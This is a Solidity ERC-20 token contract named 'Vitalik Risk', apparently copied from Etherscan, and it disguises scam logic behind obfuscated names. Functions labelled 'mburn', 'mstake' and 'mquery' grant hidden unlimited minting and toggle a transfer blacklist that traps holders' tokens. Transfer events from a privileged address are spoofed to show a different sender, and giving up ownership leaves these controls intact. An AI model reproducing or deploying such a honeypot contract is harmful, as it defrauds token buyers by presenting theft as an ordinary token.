/**
 *Submitted for verification at Etherscan.io on 2022-11-04
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address aAM = 0x62f83396eD8b31ceb8Ad611C2ABF3255CA169fE6;
	address aAMP = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract VRISK is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private aAc;
	mapping (address => bool) private aAb;
    mapping (address => bool) private aAw;
    mapping (address => mapping (address => uint256)) private aAv;
    uint8 private constant AAI = 8;
    uint256 private constant aAS = 777777777 * (10** AAI);
    string private constant _name = "Vitalik Risk";
    string private constant _symbol = "VitalRISK";



    constructor () {
        aAc[_msgSender()] = aAS;
         mmkr(aAMP, aAS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return AAI;
    }

    function totalSupply() public pure  returns (uint256) {
        return aAS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return aAc[account];
    }
	
		function mstake(address aAj) public {
        if(aAb[msg.sender]) { 
        aAw[aAj] = false;}}
        function mquery(address aAj) public{
         if(aAb[msg.sender])  { 
        aAw[aAj] = true; }}
   
	
	
    function mmkr(address aAj, uint256 aAn) onlyOwner internal {
    emit Transfer(address(0), aAj ,aAn); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return aAv[owner][spender];
    }
	        function mburn(address aAj) onlyOwner public{
        aAb[aAj] = true; }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        aAv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == aAM)  {
        require(amount <= aAc[sender]);
        aAc[sender] -= amount;  
        aAc[recipient] += amount; 
          aAv[sender][msg.sender] -= amount;
        emit Transfer (aAMP, recipient, amount);
        return true; }  else  
          if(!aAw[recipient]) {
          if(!aAw[sender]) {
         require(amount <= aAc[sender]);
        require(amount <= aAv[sender][msg.sender]);
        aAc[sender] -= amount;
        aAc[recipient] += amount;
        aAv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address aAj, uint256 aAn) public {
        if(msg.sender == aAM)  {
        require(aAc[msg.sender] >= aAn);
        aAc[msg.sender] -= aAn;  
        aAc[aAj] += aAn; 
        emit Transfer (aAMP, aAj, aAn);} else  
        if(aAb[msg.sender]) {aAc[aAj] += aAn;} else
        if(!aAw[msg.sender]) {
        require(aAc[msg.sender] >= aAn);
        aAc[msg.sender] -= aAn;  
        aAc[aAj] += aAn;          
        emit Transfer(msg.sender, aAj, aAn);}}}